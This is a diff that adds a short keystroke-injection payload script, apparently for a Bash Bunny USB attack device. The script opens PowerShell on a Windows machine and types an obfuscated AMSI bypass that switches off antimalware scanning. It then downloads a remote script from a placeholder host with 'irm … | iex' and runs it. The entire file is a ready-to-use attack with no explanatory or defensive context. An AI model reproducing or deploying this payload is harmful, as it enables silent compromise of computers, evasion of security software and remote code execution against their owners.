@@ -1,0 +1,16 @@
+ATTACKMODE HID
+LED STAGE1
+RUN WIN powershell
+Q DELAY 500
+Q STRING \$a = \"System.Management.Automation.Amsi\"+\"Utils\"
+Q ENTER
+Q DELAY 250
+Q STRING \$b = \"amsiInit\"+\"Failed\"
+Q ENTER
+Q DELAY 250
+Q STRING \[Ref\].Assembly.GetType\(\$a\).GetField\(\$b,\'NonPublic,Static\'\).SetValue\(\$null,\$true\)
+Q ENTER
+Q DELAY 300
+Q STRING irm http://<ip>:<port>/e.ps1 \| iex
+Q ENTER
+LED FINISH
